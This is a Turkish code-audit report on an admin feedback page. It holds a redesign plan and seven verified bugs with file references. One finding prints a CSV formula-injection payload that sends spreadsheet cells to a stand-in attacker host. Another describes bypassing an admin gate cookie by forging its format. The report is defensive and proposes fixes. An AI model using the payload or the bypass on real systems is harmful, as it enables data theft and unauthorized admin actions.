- Altında tek satırlık KPI şeridi: Hacim (sparkline), Ort. puan (önceki döneme göre delta), NPS (yalnız QR olduğu belirtilerek), Olumsuz oranı, Ortalama bayi yanıt süresi. Kartlar tıklanabilir filtre.
- Filtre çubuğu: arama + çip tabanlı filtreler (Kaynak, Duygu, Puan, Bayi combobox, Tarih ön ayarları "Bugün/7g/30g/Özel", İşaretler). Aktif filtreler çip olarak görünür, tek tek kaldırılır.
- Ana alan iki sütun: solda yoğun, sanallaştırılmış liste (TanStack Virtual; satır: puan, ilk satır metin, işletme, kaynak ikonu, işaret rozetleri, göreli zaman); sağda sabit detay paneli (AI sinyalleri kartı, bayi yanıtı ve SLA, müşteri geçmişi, telafi teklifleri, denetim geçmişi).
- Toplu seçimde liste üstünde yapışkan aksiyon çubuğu.

**Mobil:** liste tam genişlik, detay alttan açılan Sheet; filtreler tek "Filtreler (3)" butonunda; satırlarda kaydırma aksiyonları yerine net menü.

**Motion (ölçülü):** KPI sayıları ilk yüklemede tek seferlik sayaç; detay paneli 150-200 ms kayma; silme/gizlemede satırın yüksekliği çökerek çıkışı; yeni gelen kayıtlar için 1 sn'lik soluk vurgu. 3B veya dekoratif animasyon gerekmez — bu bir operasyon ekranı. `reducedMotion="user"` global olarak zaten var; tüm geçişler buna saygı gösterir.

**Veri / API değişiklikleri:**
1. `ConsumptionReview.deletedAt` (+ `hiddenAt`/`isPublic`) migrasyonu; tüm okuma yollarında filtre.
2. `feedback_feed` Postgres VIEW (UNION ALL) + keyset cursor sayfalama; ortak `buildFeedbackWhere` + genişletilmiş Zod sorgu şeması.
3. Uç noktalar: `GET /api/admin/feedbacks` (liste, dar `select`), `GET /api/admin/feedbacks/stats` (Redis cache, filtre hash anahtarı), `GET /api/admin/feedbacks/[source]/[id]` (detay, AI sinyalleri, bağlam), `POST /api/admin/feedbacks/bulk` (delete/hide/restore/flag, transaction, gerçek count, tam audit snapshot), `GET /api/admin/dealers/options?q=`.
4. `requireAdmin()` içinde gate çerezi doğrulaması.
5. İstemci: sayfayı `FeedbackToolbar`, `FeedbackKpiStrip`, `FeedbackList`, `FeedbackDetailPanel`, `BulkActionBar` bileşenlerine bölün; durum URL'de, veri TanStack Query ile.

---

## Çakışmalar / birleştirme önerisi

- **`/dealer/feedbacks`** (bayi gelen kutusu: yanıt, görüldü, telafi): aynı alan modelinin bayi kapsamlı görünümü. Liste satırı, detay paneli ve filtre çubuğu `components/feedback/` altında paylaşılan bileşenler olarak ortaklaştırılmalı (ekip modülünün çift-panel deseni gibi); admin sürümü yalnız ek "platform" aksiyonları (gizle, trust, AI düzeltme, tüm bayiler) ekler.
- **`/admin/ai-quality`** (AI analiz örneklerini manuel skorlama) ve **"Manuel İnceleme" filtresi** aynı işi kısmen yapıyor: düşük güvenli analizlerin incelenmesi `/admin/ai-quality` kuyruğuna taşınmalı, bu sayfada yalnız o kuyruğa link/rozet kalmalı.
- **`/admin/trust-command`** düşük puanlı geri bildirimleri id'siz bu sayfaya yönlendiriyor; `?id=` deep-link desteğiyle iki sayfa doğal olarak bağlanır, birleştirme gerekmez.
- **Panodaki `SentimentSection`** bu sayfanın KPI şeridiyle aynı veriyi gösteriyor; iki yerde aynı hesap yerine `stats` uç noktası ortak kullanılmalı.
- Sayfa **kaldırılmamalı**: platform düzeyinde tek VOC moderasyon ekranı budur; ancak yukarıdaki vizyonla yeniden tasarlanmalı.

---

## Doğrulama (şüpheci inceleme)

Her iddia çürütülmeye çalışılarak kod baştan okundu (route, sayfa, `proxy.ts`, `lib/api-auth.ts`, `lib/admin-gate-edge.ts`, `prisma/schema.prisma`, müşteri yorum route'u, `lib/export-utils.ts`). Kod çalıştırılmadı, DB'ye dokunulmadı.

### 1. Tüketim yorumu hard delete → yeniden yorum + yeniden puan, RemedyOffer cascade — **DOĞRULANDI** (önem: Yüksek)
- `app/api/admin/feedbacks/route.ts:361-364` `consumptionReview.deleteMany` (QR tarafı ise 366-369 soft delete — asimetri).
- `prisma/schema.prisma:1343` `RemedyOffer.consumptionReview ... onDelete: Cascade`; `Consumption` kaydı silinmiyor (`schema.prisma:1589`, review opsiyonel 1-1).
- Tek tekrar koruması `consumption.review` varlığı (`app/api/customer/consumptions/[id]/review/route.ts:155-160`) ve `consumptionId @unique` (`schema.prisma:1604`); satır silinince ikisi de serbest kalır. Tüketim yaşı/zaman penceresi kontrolü yok.
- İstemci de bunu açar: `app/customer/consumptions/[id]/page.tsx:187` review yoksa `POST` atar.
- **Senaryo:** Admin uygunsuz bir tüketim yorumunu siler → müşteri aynı tüketim sayfasını açar, form boş gelir, yeniden gönderir → `capFeedbackPoints` + `creditPointsAndXp` (route.ts:187-194) tekrar çalışır, yeni `points_credited` event'i yazılır. Puan günlük/haftalık cap'e tabi ama "bir tüketim = bir kredi" değişmezi bozulur. Aynı anda o yoruma bağlı kabul edilmiş telafi teklifleri (`RemedyOffer` + `RemedyTimelineEvent`) iz bırakmadan silinir; AuditLog yalnız `{count, type}` tutar (route.ts:372-381), içerik/puan izi kaybolur.
- Not: "karakter rozeti sayacını düşürür" kısmı doğru (`lib/character-badges.ts:194,352-365` canlı `ConsumptionReview` sayar) fakat verilmiş rozeti geri almaz; yan etki ikincil.

### 2. 'Tümü' sekmesinde 100+100 havuz ile birleşik sayfalama — **DOĞRULANDI** (önem: Yüksek; varsayılan görünüm)
- Sayfa `typeFilter='all'` iken `type` parametresi göndermez (`page.tsx:189`) → route'ta `!type` dalı. QR `take: takeLimit` (=100, `route.ts:62-64,75`), tüketim `take: 100` (`route.ts:137`), birleştirilip `slice(skip, skip+pageSize)` (`route.ts:181`), ama `total = qrTotal + consumptionTotal` gerçek sayı (`route.ts:179`).
- **Düzeltme (rakam):** 500 QR + 50 tüketim, pageSize 20 → total 550, 28 sayfa; havuz 150 satır. 1-5. sayfalar doğru (birleşimin ilk 100'ü her iki havuzun ilk 100'ünde bulunur). 6-7. sayfalar ve 8. sayfanın 10 satırı yanlış (101+. QR kayıtları havuzda yok, eski tüketim yorumları araya girer); **9. sayfadan** itibaren liste boş. İddiadaki "8. sayfadan itibaren boş" bir sayfa kaymış, özü doğru.

### 3. Toplu silme HTTP hatasını yutup başarı bildiriyor + sayfa dışı seçimler sessizce silinmiyor — **DOĞRULANDI** (önem: Orta-Yüksek)
- `page.tsx:267` `await Promise.all(promises)` — `fetch` 4xx/5xx'te reject etmez, `res.ok` hiç kontrol edilmiyor; `page.tsx:269` her durumda `${selectedIds.length} geri bildirim silindi`.
- Seçim sayfa/filtre değişiminde temizlenmiyor (`setPage` çağrıları `selectedIds`'e dokunmuyor, `page.tsx:458,469,482,738,742`); `handleDelete` yalnız mevcut `feedbacks` dizisinde bulunan id'leri gönderiyor (`page.tsx:248-249`).
- **Senaryo:** Sayfa 1'de 5 kayıt seç → sayfa 2'ye geç, 3 kayıt daha seç → Sil → yalnız 3'ü gider, toast "8 geri bildirim silindi" der; sayfa 1'dekiler hâlâ yerinde. Ayrıca rate-limit 429 (`route.ts:339-351`) ya da 500 dönerse de başarı toast'u gösterilir.
- Sunucu tarafı `deleted: feedbackIds.length` (`route.ts:383`) gerçek etkilenen sayı değil (var olmayan/zaten silinmiş id'ler de sayılır); istemci bu alanı zaten okumuyor.

### 4. Arama: e-posta eşleşmesini istemci süzmesi gizliyor; işletme adı sunucuda aranmıyor — **DOĞRULANDI** (önem: Orta)
- Sunucu QR aramasında `user.email` de var (`route.ts:52`), istemci süzmesi `text`/`businessName`/`user.name` ile sınırlı (`page.tsx:310-317`) → e-postayla aranan kayıt sunucudan gelir ama ekrandan düşer; liste "Geri bildirim bulunamadı" derken `totalPages > 1` ise "Toplam N sonuç" görünür (`page.tsx:732-736`).
- Sunucu sorgusunda işletme/QR adı yok (`route.ts:48-54`, `110-115`); placeholder "Metin, kullanıcı veya işletme ara..." (`page.tsx:451`). İşletme adıyla arama yalnız metinde geçiyorsa sonuç verir; istemci tarafındaki `businessName` süzmesi sunucunun zaten döndürmediği kayıtları bulamaz.
- Ek: istemci süzmesi debounce'suz `searchQuery` kullanıyor; yazarken liste, sunucu yanıtından bağımsız olarak anlık daralıyor.

### 5. Detay modalinde Duygular alanı dizi indeksleri — **DOĞRULANDI** (önem: Düşük; görüntü hatası, kritik/yüksek değil)
- Tüm yazma yolları `emotions` alanına string dizisi yazar: `lib/inngest/feedback-analyze-pipeline.ts:66`, `app/api/feedbacks/route.ts:478`, `app/api/ai/analyze/route.ts:152,236`. `typeof [] === 'object'` olduğu için `route.ts:97` `Object.keys(["mutlu","memnun"])` → `["0","1"]`; modal `page.tsx:813-820` bunları rozet olarak basar. Doğru normalize örneği `app/api/feedbacks/route.ts:112-117`.

### 6. Admin gizli kapı çerezi /api/admin/* katmanında doğrulanmıyor — **DOĞRULANDI** (önem: Yüksek, sistem geneli)
- `proxy.ts:105-119` `/api/` yollarını `authMiddleware`'e hiç sokmadan döndürür (yalnız güvenlik/CORS başlığı). Gate kontrolü yalnız `proxy.ts:79-88`'de sayfa yolları için. `requireAuth` (`lib/api-auth.ts:52-80`) yalnız rol + token-replay bakar. Kod tabanında `admin_gate` çerezini API'de doğrulayan başka bir yer yok (grep: yalnız `proxy.ts:81`, `app/api/admin/gate/route.ts:68` set eden).
- **Senaryo:** Rolü ADMIN yapılmış ama gate rakamını bilmeyen hesap, oturum çereziyle `DELETE /api/admin/feedbacks` `{"feedbackIds":[...],"type":"consumption"}` gönderir → 200, kayıtlar hard delete. Gate'in tehdit modeli ("rolü kazara ADMIN yapılan stajyer bile giremez", `proxy.ts:76-77`) API'de tamamen boşa düşer.
- Ek gözlem: sayfa katmanındaki kontrol de HMAC doğrulamaz (`lib/admin-gate-edge.ts:14-22` yalnız `userId.` + 64 hex biçimi); kullanıcı kendi id'si + rastgele 64 hex ile çerezi elle yazarak sayfa kapısını da geçebilir. Bu, düzeltmenin `requireAdmin()` içinde Node tarafında `verifyGateCookie` (gerçek HMAC) ile yapılması gerektiğini güçlendirir.

### 7. CSV dışa aktarımda formül enjeksiyonu — **DOĞRULANDI** (önem: Orta)
- `lib/export-utils.ts:57-64` ve `app/api/export/feedbacks/route.ts:44-52` yalnız çift tırnak kaçışı yapıyor; `=`, `+`, `-`, `@`, TAB, CR ile başlayan hücreler nötrlenmiyor. Excel/LibreOffice tırnaklı CSV alanını da formül olarak yorumlar; tırnaklama korumaz.
- Girdi kullanıcı kontrollü: QR yorum metni (`lib/validations.ts:99`, yalnız max uzunluk), müşteri adı (`userName` sütunu), tüketim yorumu.
- **Senaryo:** Anonim QR ziyaretçisi `=HYPERLINK("https://saldirgan.example/?d="&A2&B2;"Detay")` yazar → admin "Excel (CSV)" indirir, açar → tıklanabilir sızdırma bağlantısı/formül çalışır. Modern Excel DDE/komut çalıştırmayı varsayılan olarak uyarı ile engellediğinden etki "uzaktan kod" değil, veri sızdırma/sosyal mühendislik düzeyinde.
- Düzeltme: ortak `toCsvCell()` yardımcısı (baştaki `= + - @ \t \r` için `'` öneki) hem istemci hem sunucu dışa aktarımında tek yerden kullanılmalı.

**Özet:** 7 iddianın 7'si kodla doğrulandı; #2'de sayfa sayısı bir kaydırıldı, #5'in önemi "Düşük"e indirildi, #6'ya HMAC'siz sayfa-kapısı gözlemi eklendi.
